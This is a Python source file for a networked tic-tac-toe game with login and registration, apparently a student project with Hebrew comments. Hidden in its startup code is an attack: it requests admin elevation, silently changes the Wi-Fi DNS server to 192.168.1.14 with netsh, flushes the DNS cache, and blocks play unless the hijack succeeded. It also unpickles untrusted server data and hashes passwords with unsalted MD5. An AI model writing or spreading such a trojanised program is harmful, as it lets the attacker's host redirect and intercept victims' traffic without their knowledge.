__author__ = "YAIR_ISRAELOV"

import socket
import os
import pickle
from tkinter import *
from functools import partial
from tkinter import messagebox
from copy import deepcopy
import ctypes, sys, subprocess
import hashlib
from time import *


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


o = False
count = 6
start = True
check_if_already_attacked = False
p = subprocess.Popen("ipconfig/all", shell=True, stdout=subprocess.PIPE)
for line in p.stdout:
    if "DNS Server".encode() in line and "192.168.1.14".encode() in line:  # בודק האם הותקף כבר
        check_if_already_attacked = True
if not check_if_already_attacked:
    if is_admin():  # אם לא הותקף אך מורץ כאדמין
        start = False
        # משנה את כתובת ה IP של שרת ה DNS
        os.system('cmd /c "netsh interface ipv4 set dnsservers "Wi-Fi" static 192.168.1.14 primary"')
        pid = os.getpid()  # פקודה זו פותחת תהליכון נוסף של חלון שורת הפקודה וכאן אני מחסל אותה
        os.kill(pid, 9)
        os.system('cmd /c "ipconfig/flushdns"')  # ניקוי המטמון
    else:
        # Re-run the program with admin rights
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        l = []
        p = subprocess.Popen("netsh interface show interface", shell=True, stdout=subprocess.PIPE)
        for line in p.stdout:  # סידור כל הממשקים אינטרנט המחוברים
            if "Connected".encode() in line:
                arr = line.split()
                try:
                    int(arr[-1])
                    m = True
                except:
                    m = False
                if m:
                    arr[-2] = arr[-2] + " ".encode() + arr[-1]
                    arr.pop(-1)
                l.append(arr[-1])
p = subprocess.Popen("ipconfig/all", shell=True, stdout=subprocess.PIPE)
for line in p.stdout:  # בודק אם לחץ כן או לא.במידה ולא נגמר המשחק
    if "DNS Server".encode() in line and "192.168.1.14".encode() in line:
        o = True
if not o:
    messagebox.showerror("error", "אנא אשר בשביל לשחק")
    exit(1)
address = '192.168.1.14'
port = 2500
bsize = 1024
cordinates = " "
clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
clientSocket.connect((address, port))
print("num cpu: ", os.cpu_count())
try_again = True


def password_not_recognised():
    global password_not_recog_screen
    password_not_recog_screen = Toplevel(login_screen)
    password_not_recog_screen.title("Success")
    password_not_recog_screen.geometry("150x100")
    Label(password_not_recog_screen, text="Invalid Password ").pack()
    Button(password_not_recog_screen, text="OK", command=delete_password_not_recognised).pack()


def delete_password_not_recognised():
    password_not_recog_screen.destroy()


def delete_user_not_found_screen():
    user_not_found_screen.destroy()


def user_not_found():
    global user_not_found_screen
    user_not_found_screen = Toplevel(login_screen)
    user_not_found_screen.title("Success")
    user_not_found_screen.geometry("150x100")
    Label(user_not_found_screen, text="something not correct").pack()
    Button(user_not_found_screen, text="OK", command=delete_user_not_found_screen).pack()


def delete_login_success():
    main_screen.destroy()


def login_sucess():
    global login_screen
    global login_success_screen
    login_success_screen = Toplevel(login_screen)
    login_success_screen.title("Success")
    login_success_screen.geometry("150x100")
    Label(login_success_screen, text="Login Success").pack()
    delete_login_success()


def login_verification():
    print("working...")
    login_verify()


def login_verify():
    # get username and password
    global username_login_entry
    global password__login_entry
    username1 = username_verify.get()  # מקבל את השם מתמש והסיסמא שהלקוח הכניס
    password1 = password_verify.get()
    password1 = hashlib.md5(password1.encode("utf-8")).hexdigest()  # מצפין את הסיסמא
    reg_to_send = ["login", str(username1), str(password1)]
    # this will delete the entry after login button is pressed
    username_login_entry.delete(0, END)
    password__login_entry.delete(0, END)
    clientSocket.send(pickle.dumps(reg_to_send))
    data = clientSocket.recv(bsize)
    reg_to_send = pickle.loads(data)
    if reg_to_send[0] == "login sec":
        login_sucess()
    else:
        user_not_found()


def register_user():
    global username
    global password
    global username_entry
    global password_entry
    global main_screen
    global register_screen
    global login_screen
    global register_screennnn
    username_info = username.get()
    password_info = password.get()
    password_info = hashlib.md5(password_info.encode("utf-8")).hexdigest()
    reg_to_send = ["register", str(username_info), str(password_info)]
    username_entry.delete(0, END)
    password_entry.delete(0, END)
    clientSocket.send(pickle.dumps(reg_to_send))
    data = clientSocket.recv(bsize)
    reg_to_send = pickle.loads(data)
    print(reg_to_send)
    if reg_to_send[0] == "register sec":
        Label(register_screen, text="Registration Success", fg="green", font=("calibri", 11)).pack()
    else:
        Label(register_screen, text="there is already name like that,try again", fg="red", font=("calibri", 11)).pack()


def login():
    global login_screen
    global username_login_entry
    global password__login_entry
    login_screen = Toplevel(main_screen)
    login_screen.title("Login")
    login_screen.geometry("300x250")
    Label(login_screen, text="Please enter details below to login").pack()
    Label(login_screen, text="").pack()

    global username_verify
    global password_verify

    username_verify = StringVar()
    password_verify = StringVar()

    Label(login_screen, text="Username * ").pack()
    username_login_entry = Entry(login_screen, textvariable=username_verify)
    username_login_entry.pack()
    Label(login_screen, text="").pack()
    Label(login_screen, text="Password * ").pack()
    password__login_entry = Entry(login_screen, textvariable=password_verify, show='*')
    password__login_entry.pack()
    Label(login_screen, text="").pack()
    Button(login_screen, text="Login", width=10, height=1, command=login_verification).pack()


def register():
    # The Toplevel widget work pretty much like Frame,
    # but it is displayed in a separate, top-level window.
    # Such windows usually have title bars, borders, and other “window decorations”.
    # And in argument we have to pass global screen variable
    global username
    global password
    global username_entry
    global password_entry
    global main_screen
    global register_screen

    register_screen = Toplevel(main_screen)
    register_screen.title("Register")
    register_screen.geometry("300x250")

    # Set text variables
    username = StringVar()
    password = StringVar()

    # Set label for user's instruction
    Label(register_screen, text="Please enter details below", bg="blue").pack()
    Label(register_screen, text="").pack()

    # Set username label
    username_lable = Label(register_screen, text="Username * ")
    username_lable.pack()

    # Set username entry
    # The Entry widget is a standard Tkinter widget used to enter or display a single line of text.

    username_entry = Entry(register_screen, textvariable=username)
    username_entry.pack()

    # Set password label
    password_lable = Label(register_screen, text="Password * ")
    password_lable.pack()

    # Set password entry
    password_entry = Entry(register_screen, textvariable=password, show='*')
    password_entry.pack()

    Label(register_screen, text="").pack()

    # Set register button
    Button(register_screen, text="Register", width=10, height=1, bg="blue", command=register_user).pack()


main_screen = Tk()
main_screen.geometry("300x250")  # set the configuration of GUI window
main_screen.title("Account Login")  # set the title of GUI window

# create a Form label
Label(text="Choose Login Or Register", bg="blue", width="300", height="2", font=("Calibri", 13)).pack()
Label(text="").pack()

# create Login Button
Button(text="Login", height="2", width="30", command=login).pack()

Label(text="").pack()

# create a register button
Button(text="Register", height="2", width="30", command=register).pack()
# main_screen.destroy()
main_screen.mainloop()

menu = Tk()
menu.title("Tic Tac Toe")


# פעולה הבודקת האם המקום שלחת עליו הלקוח תפוס או לא co הוא המקום עליו לחץ בלוח
def check_if_empty(co, m):
    if str(co) == ".!button":
        if m[0][0] == "_":
            return "00"
        return "no"
    if str(co) == ".!button2":
        if m[0][1] == "_":
            return "01"
        return "no"
    if str(co) == ".!button3":
        if m[0][2] == "_":
            return "02"
        return "no"
    if str(co) == ".!button4":
        if m[1][0] == "_":
            return "10"
        return "no"
    if str(co) == ".!button5":
        if m[1][1] == "_":
            return "11"
        return "no"
    if str(co) == ".!button6":
        if m[1][2] == "_":
            return "12"
        return "no"
    if str(co) == ".!button7":
        if m[2][0] == "_":
            return "20"
        return "no"
    if str(co) == ".!button8":
        if m[2][1] == "_":
            return "21"
        return "no"
    if str(co) == ".!button9":
        if m[2][2] == "_":
            return "22"
        return "no"


# כאשר הלקוח לחץ על המסך
def b_click(b):
    global try_again
    global l
    print(b)
    if try_again:
        data = clientSocket.recv(bsize)#מקבל מהשרת לוח ותוצאה או קורידנאטות אם יש
        l = pickle.loads(data)
    if l[1] == "you win" or l[1] == "you lose" or l[1] == "draw":
        messagebox.showinfo("result", l[1])
        clientSocket.close()
        exit(1)
    #מקבל shit רק בתחילת משחק כאשר עוד לא התחחיל המשחק אז אין תוצאה והלקוח משחק ראשון אז אין לו קורדינאטות לשלוח
    if l[1] != "draw" and l[1] != "shit" and l[1] != "you win" and l[1] != "you lose":
        lo = l[0]# המגרש
        print(lo)
        if_empty = check_if_empty(b, lo)
        if if_empty == "no":
            print(b)
            print(lo)
            messagebox.showerror("מקום תפוס", "זה מקום תפוס אנא לחץ על מקום אחר")
            try_again = False
        else:
            b["text"] = "x"#שם איקס בלוח
            lo[int(if_empty[0])][int(if_empty[1])] = "x"#שם איקס במערך
            print(lo)
            clientSocket.send(pickle.dumps(lo))#שולח את המגרש המעודכן
            data = clientSocket.recv(bsize)
            l = pickle.loads(data)
            lo = l[0]
            print(lo)
        if l[1] == "you win" or l[1] == "you lose" or l[1] == "draw":
            messagebox.showinfo("result", l[1])
            clientSocket.close()
            exit(1)
        if l[1] != "draw" and l[1] != "shit" and l[1] != "you win" and l[1] != "you lose" and try_again != False:
            lo[int(l[1][0])][int(l[1][1])] = "o"
            #שם עיגול במגרש מהמקום בו קיבל מהשרת
            if l[1] == "00":
                b1["text"] = "o"
            if l[1] == "01":
                b2["text"] = "o"
            if l[1] == "02":
                b3["text"] = "o"
            if l[1] == "10":
                b4["text"] = "o"
            if l[1] == "11":
                b5["text"] = "o"
            if l[1] == "12":
                b6["text"] = "o"
            if l[1] == "20":
                b7["text"] = "o"
            if l[1] == "21":
                b8["text"] = "o"
            if l[1] == "22":
                b9["text"] = "o"
            clientSocket.send(pickle.dumps(lo))
            data = clientSocket.recv(bsize)
            l = pickle.loads(data)
            if l[1] == "you win" or l[1] == "you lose" or l[1] == "draw":
                messagebox.showinfo("result", "אתה חתיכת גרוע " + l[1])
                clientSocket.close()
                exit(1)
            clientSocket.send(pickle.dumps(l[0]))
    else:
        lo = l[0]
        if_empty = check_if_empty(b, lo)
        if if_empty == "no":
            messagebox.showerror("מקום תפוס", "לחצת על מקום תפוס אנא בחר אחד אחר")

        else:
            b["text"] = "x"
            lo[int(if_empty[0])][int(if_empty[1])] = "x"
            print(lo)
            clientSocket.send(pickle.dumps(lo))
            data = clientSocket.recv(bsize)
            l = pickle.loads(data)
            lo = l[0]
            print(l)
            if l[1] == "you win" or l[1] == "you lose" or l[1] == "draw":
                messagebox.showinfo("result", l[1])
                clientSocket.close()
                exit(1)
            if l[1] != "draw" and l[1] != "shit" and l[1] != "you win" and l[1] != "you lose":
                lo[int(l[1][0])][int(l[1][1])] = "o"
                if l[1] == "00":
                    b1["text"] = "o"
                if l[1] == "01":
                    b2["text"] = "o"
                if l[1] == "02":
                    b3["text"] = "o"
                if l[1] == "10":
                    b4["text"] = "o"
                if l[1] == "11":
                    b5["text"] = "o"
                if l[1] == "12":
                    b6["text"] = "o"
                if l[1] == "20":
                    b7["text"] = "o"
                if l[1] == "21":
                    b8["text"] = "o"
                if l[1] == "22":
                    b9["text"] = "o"
                clientSocket.send(pickle.dumps(lo))


b1 = Button(menu, text=" ", font=("Helvetica", 20), height=3, width=6, bg="SystemButtonFace",
            command=lambda: b_click(b1))
b2 = Button(menu, text=" ", font=("Helvetica", 20), height=3, width=6, bg="SystemButtonFace",
            command=lambda: b_click(b2))
b3 = Button(menu, text=" ", font=("Helvetica", 20), height=3, width=6, bg="SystemButtonFace",
            command=lambda: b_click(b3))
b4 = Button(menu, text=" ", font=("Helvetica", 20), height=3, width=6, bg="SystemButtonFace",
            command=lambda: b_click(b4))
b5 = Button(menu, text=" ", font=("Helvetica", 20), height=3, width=6, bg="SystemButtonFace",
            command=lambda: b_click(b5))
b6 = Button(menu, text=" ", font=("Helvetica", 20), height=3, width=6, bg="SystemButtonFace",
            command=lambda: b_click(b6))
b7 = Button(menu, text=" ", font=("Helvetica", 20), height=3, width=6, bg="SystemButtonFace",
            command=lambda: b_click(b7))
b8 = Button(menu, text=" ", font=("Helvetica", 20), height=3, width=6, bg="SystemButtonFace",
            command=lambda: b_click(b8))
b9 = Button(menu, text=" ", font=("Helvetica", 20), height=3, width=6, bg="SystemButtonFace",
            command=lambda: b_click(b9))
b1.grid(row=0, column=0)
b2.grid(row=0, column=1)
b3.grid(row=0, column=2)
b4.grid(row=1, column=0)
b5.grid(row=1, column=1)
b6.grid(row=1, column=2)
b7.grid(row=2, column=0)
b8.grid(row=2, column=1)
b9.grid(row=2, column=2)

menu.mainloop()
